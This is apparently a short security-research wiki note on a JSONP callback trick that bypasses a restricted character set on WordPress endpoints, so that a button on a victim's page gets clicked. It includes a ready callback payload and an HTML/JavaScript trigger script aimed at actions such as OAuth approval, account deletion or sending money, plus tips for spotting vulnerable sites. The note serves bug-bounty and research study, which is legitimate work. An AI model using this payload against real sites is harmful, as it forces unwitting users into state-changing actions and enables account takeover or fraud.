---
title: No-parens JSONP callback dot-chain
slug: jsonp-callback-no-parens
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/dom-xss, technique/csp-bypass]
inbound: []
---

# No-parens JSONP callback dot-chain

## Pattern
"Secure" JSONP endpoint that allows callback chars `[a-zA-Z.]` (no
parentheses, no brackets) is still exploitable. Use callback as a chained
property access ending in `.click` (or any callable-without-args method):

```
?callback=opener.document.querySelector('%23approve').click
```

Browser invokes the chained method as a function and ignores the extra
JSONP-passed JSON args. Used to trigger a CSRF-style click on attacker-
chosen button on the parent window after the parent has been navigated
to the victim origin (becoming same-origin).

WordPress sites have this gadget by default — flag any `target.com/blog/`
reverse-proxy.

## Preconditions
- JSONP endpoint with restricted (no-parens) callback charset.
- A same-origin page in `window.opener` (after attacker `window.open`s
  target).
- A clickable element that triggers a state-changing action (OAuth
  approve, account-delete, send-money confirm).

## Detection
- Manually inspect every JSONP endpoint listed in CSP `script-src`.
- WordPress fingerprint (`wp-content`, `wp-json`) → likely vulnerable
  by default.

## Triggering
```html
<script>
  w = window.open('https://target.com/page-with-approve-button');
  setTimeout(()=>{
    location =
      'https://wordpress-blog/wp-json/?callback=' +
      'opener.document.querySelector(%22%23approve%22).click';
  }, 2000);
</script>
```

## Related
- [[jsonp-callback-csp-bypass]] — full-call variant
- [[iframe-without-csp-proxy]]

## Seen in the wild
- Wide WordPress prevalence.
- Critical Thinking Podcast Ep 70.

## References
- octagon.net — "Bypassing CSP using WordPress by abusing same origin
  method execution"
- Critical Thinking Podcast Ep 70
